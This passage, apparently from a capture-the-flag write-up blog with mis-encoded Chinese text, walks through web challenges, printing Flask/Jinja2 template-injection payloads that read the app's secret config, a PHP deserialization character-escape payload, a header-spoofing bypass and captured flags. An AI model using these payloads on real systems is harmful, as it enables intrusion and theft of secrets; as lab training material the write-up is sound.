<span class="token comment">//value æ˜¯ HTML è¡¨å•å…ƒç´ ï¼ˆå¦‚ &lt;input&gt;ã€&lt;textarea&gt;ã€&lt;select&gt; ç­‰ï¼‰çš„ä¸€ä¸ªå±æ€§ï¼Œç”¨äºè·å–æˆ–è®¾ç½®è¿™äº›å…ƒç´ çš„å€¼ã€‚æ‰€ä»¥ï¼Œå½“å¯¹ document.getElementById("vcode") è¿”å›çš„å…ƒç´ ä½¿ç”¨ .value æ—¶ï¼Œå°±å¯ä»¥å¾—åˆ°è¯¥å…ƒç´ å½“å‰æ‰€åŒ…å«çš„å€¼ã€‚</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"0cd4da0223c0b280829dc3ea458d655c"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ‚¨é€šè¿‡äº†éªŒè¯ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          window<span class="token operator">.</span>location <span class="token operator">=</span> <span class="token string double-quoted-string">"./flag.php"</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¯·è¾“å…¥æˆæƒç "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°è¾“å…¥æ¡†å¯¹åº”çš„idä¸ºvcode</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0b2ca3411cc6c5f6872c342bad8e30c7.png"></p>
<p>æ‰¾ä¸ªç½‘ç«™è§£ä¸€ä¸‹<a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5å…è´¹åœ¨çº¿è§£å¯†ç ´è§£_MD5åœ¨çº¿åŠ å¯†-SOMD5</a></p>
<pre class="line-numbers language-none"><code class="language-none">0cd4da0223c0b280829dc3ea458d655c
ARandomString<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<blockquote>
<p>æŠŠè´­ä¹°è€…çš„IPä¿å­˜äº†</p>
</blockquote>
<p><code>X-Forwarded-For: 127.0.0.1</code></p>
<p>flag{bf368694-e93d-4ec1-ae3b-05c305f54eaa}</p>
<hr>
<h3 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> os

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span>
<span class="token comment">#ä»ç¯å¢ƒå˜é‡ä¸­è·å– FLAGï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨ Flask åº”ç”¨çš„é…ç½®ä¸­ã€‚os.environ.pop('FLAG') ä¼šè·å–å¹¶ç§»é™¤ç¯å¢ƒå˜é‡ä¸­çš„ FLAGã€‚</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine&gt;'</span><span class="token punctuation">)</span>
<span class="token comment">#è¿™æ˜¯ä¸€ä¸ªåŠ¨æ€çš„ URL éƒ¨åˆ†ï¼Œå…¶ä¸­ &lt;...&gt; è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå˜é‡éƒ¨åˆ†ï¼Œpath æ˜¯å˜é‡çš„ç±»å‹ï¼Œshrine æ˜¯å˜é‡çš„åç§°ã€‚path ç±»å‹è¡¨ç¤ºè¿™ä¸ªå˜é‡å¯ä»¥åŒ¹é…ä»»æ„çš„è·¯å¾„ï¼ŒåŒ…æ‹¬æ–œæ  /ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒèƒ½æ•è· /shrine/ åé¢çš„ä»»æ„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ä¼šå°†æ•è·åˆ°çš„å†…å®¹ä½œä¸ºå‚æ•°ä¼ é€’ç»™å¯¹åº”çš„è§†å›¾å‡½æ•°ã€‚</span>
<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#å°† some/path ä½œä¸ºå‚æ•°ä¼ é€’ç»™ shrine å˜é‡ã€‚</span>

    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span><span class="token comment">#æ™®é€šçš„{{config}}æˆ–è€…{{self}}æ— æ³•ä½¿ç”¨</span>
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s
    <span class="token comment">#join æ˜¯å­—ç¬¦ä¸²å¯¹è±¡çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºå°†ä¸€ä¸ªå¯è¿­ä»£å¯¹è±¡ï¼ˆå¦‚åˆ—è¡¨ï¼‰ä¸­çš„å…ƒç´ ç”¨æŒ‡å®šçš„å­—ç¬¦ä¸²è¿æ¥èµ·æ¥ã€‚è¿™é‡Œä½¿ç”¨ç©ºå­—ç¬¦ä¸² '' ä½œä¸ºè¿æ¥ç¬¦ï¼Œå°†åˆ—è¡¨ä¸­çš„å…ƒç´ ä¾æ¬¡æ‹¼æ¥æˆä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²ã€‚</span>
 <span class="token comment">#åˆ—è¡¨æ¨å¯¼å¼ä¼šéå† blacklist åˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´  cï¼Œå¹¶å°†å…¶æ’å…¥åˆ° '{{% set {}=None%}}' è¿™ä¸ªå­—ç¬¦ä¸²æ¨¡æ¿ä¸­ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²åˆ—è¡¨ã€‚</span>
<span class="token comment">#{{% ... %}} æ˜¯ Jinja2 æ¨¡æ¿çš„æ ‡ç­¾è¯­æ³•ï¼Œç”¨äºåœ¨æ¨¡æ¿ä¸­æ‰§è¡Œ Python ä»£ç ã€‚</span>
<span class="token comment">#set æ˜¯ Jinja2 æ¨¡æ¿ä¸­çš„ä¸€ä¸ªè¯­å¥ï¼Œç”¨äºå®šä¹‰å˜é‡ã€‚</span>
<span class="token comment">#{} æ˜¯ Python å­—ç¬¦ä¸²æ ¼å¼åŒ–ä¸­çš„å ä½ç¬¦ï¼Œformat(c) ä¼šå°† c çš„å€¼å¡«å……åˆ°è¿™ä¸ªå ä½ç¬¦ä¸­ã€‚</span>

    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2130787">ä¸€æ–‡äº†è§£SSTIå’Œæ‰€æœ‰å¸¸è§payload ä»¥flaskæ¨¡æ¿ä¸ºä¾‹-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p>
<p>è¿‡æ»¤äº†å°æ‹¬å·</p>
<p>ç”¨pythonçš„å†…ç½®å‡½æ•°</p>
<p><code>config.items</code> ä¸€ä¸ªç±»å­—å…¸çš„å¯¹è±¡ , åŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment">#æœç´¢app,å‘ç°current_app </span>
<span class="token comment">#åœ¨Flaskä¸­ï¼Œcurrent_appæ˜¯ä»£ç†å¯¹è±¡ï¼ŒæŒ‡å‘å½“å‰çš„appå®ä¾‹ã€‚</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment">#æœ‰FLAG</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>

<span class="token punctuation">{</span><span class="token punctuation">{</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†safe_jinjaå‡½æ•°ä¸­çš„å¤„ç†æ˜¯ï¼Œå°†configè®¾ç½®ä¸ºNoneã€‚å› ä¸ºåœ¨safe_jinjaå‡½æ•°ä¸­ï¼Œä¼šå°†é»‘åå•ä¸­çš„æ¯ä¸ªè¯ï¼ˆconfigå’Œselfï¼‰ç”¨è¿™æ ·çš„è¯­å¥è®¾ç½®ä¸ºNoneã€‚æ‰€ä»¥åœ¨æ¨¡æ¿æ¸²æŸ“çš„æ—¶å€™ï¼Œconfigå˜é‡ä¼šè¢«è®¾ç½®ä¸ºNoneï¼Œè€Œæ— æ³•è®¿é—®åŸæ¥çš„configå¯¹è±¡ã€‚</p>
<p>ä½†current_appæ˜¯å¦ä¸€ä¸ªå˜é‡ï¼Œå¯èƒ½æ²¡æœ‰è¢«è¦†ç›–ã€‚æ¯”å¦‚ï¼Œå‡è®¾åœ¨æ¨¡æ¿ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®åˆ°current_appï¼Œç„¶åé€šè¿‡current_app.configæ¥è·å–é…ç½®ã€‚è¿™æ—¶å€™ï¼Œè™½ç„¶configå˜é‡è¢«è®¾ç½®ä¸ºNoneï¼Œä½†current_appçš„configå±æ€§å¯èƒ½ä¾ç„¶å­˜åœ¨ã€‚</p>
<hr>
<h3 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span><span class="token class-name type-declaration">php</span>

<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span><span class="token comment">#æŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºå­—ç¬¦ä¸²</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#é”€æ¯ä¼šè¯</span>
<span class="token punctuation">}</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#å°† POST è¯·æ±‚ä¸­çš„æ‰€æœ‰å‚æ•°æå–åˆ°å½“å‰ä½œç”¨åŸŸä¸­ï¼Œä½¿å®ƒä»¬å¯ä»¥ç›´æ¥ä½œä¸ºå˜é‡ä½¿ç”¨ã€‚</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#å­˜å‚¨åœ¨ä¼šè¯ä¸­</span>
<span class="token punctuation">}</span>

<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>phpinfo</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4aa1149f0ed5bfab15fcf48cf2bdbc94.png"></p>
<p>d0g3_f1ag.php</p>
<blockquote>
<p>extractä¼šæŠŠPOSTçš„å‚æ•°å˜æˆå½“å‰ä½œç”¨åŸŸçš„å˜é‡ï¼Œå¦‚æœPOSTä¸­æœ‰åŒåçš„å˜é‡ï¼Œå¯èƒ½ä¼šè¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœPOSTä¸­æœ‰_SESSIONå‚æ•°ï¼Œå¯èƒ½ä¼šè¢«è¦†ç›–</p>
</blockquote>
<p>ä½†æ˜¯åé¢çš„ $_SESSION[â€˜imgâ€™]è¦†ç›–ä¸äº†</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107135706">PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸è¯¦è§£_php filterå­—ç¬¦ä¸²æº¢å‡º-CSDNåšå®¢</a></p>
<p>æ£€æµ‹åˆ°â€™flagâ€™ç­‰å…³é”®å­—å°±æŠŠå…¶æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆå°±åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ•…æ„è¾“å…¥æ•æ„Ÿå­—ç¬¦ï¼Œæ›¿æ¢ä¸ºç©ºä¹‹åæ¥å®ç°å­—ç¬¦é€ƒé€¸ã€‚</p>
<p>imgéšä¾¿ä¼ ï¼Œä¼šè¢«æ›¿æ¢æˆbase64(â€˜guest_img.pngâ€™)å³â€™ZDBnM19mMWFnLnBocA==â€™</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span><span class="token class-name type-declaration">php</span>
<span class="token variable">$sessionData</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string single-quoted-string">'q'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'img'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'ZDBnM19mMWFnLnBocA=='</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'xaxa'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">';s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";i:0;i:1;'</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"q"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xaxa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string double-quoted-string">";i:0;i:1;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¦è¦†ç›–<code>";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"xaxa";s:47:</code>æ€»å…±56ä¸ªå­—ã€‚</p>
<p>æ•…ç”¨<code>flagflagflagflagflagflagflagflagflagflagflagflagflagflag</code>ä»£</p>
<p>å…ˆ<code>d0g3_f1ag.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"q"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">56</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flagflagflagflagflagflagflagflagflagflagflagflagflagflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"xaxa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn<span class="token string double-quoted-string">";i:0;i:1;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>i:7;i:8</code>ï¼Œ iä»£è¡¨æ•°å­—ï¼Œ7ä»£è¡¨é”®ï¼Œå°±æ˜¯7ï¼Œå€¼ä¹Ÿæ˜¯æ•°å­—ï¼Œå€¼ä¸º8ï¼Œç´¢å¼•ä¸º7ï¼Œå€¼ä¸º8ï¼Œä»¥æ»¡è¶³æœ€å‰é¢<code>a:3:</code>ä¸­çš„3</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>img<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>xaxa<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åœ¨<code>/d0g3_fllllllag</code>é‡Œ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflagflagflagflagflagflagflagflag<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>img<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>xaxa<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"L2QwZzNfZmxsbGxsbGFn"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

flag<span class="token punctuation">{</span><span class="token number">656</span>ea1d3<span class="token operator">-</span>a8aa<span class="token operator">-</span><span class="token number">4</span>a62<span class="token operator">-</span><span class="token number">9</span>b02<span class="token operator">-</span><span class="token number">0</span>a58d00e7421<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><del>è¯è¯´æœ‰äº›wpè¿˜æœ‰æ—¶æ•ˆæ€§ä»€ä¹ˆçš„ï¼ˆ</del></p>
<hr>
<h3 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h3><p><code>cat '/home/kali/æ¡Œé¢/1/www.tar.gz'      </code></p>
<p>çˆ†å‡ºæ¥ä¸€å †phpï¼ŒçœŸæ— æ•Œäº†</p>
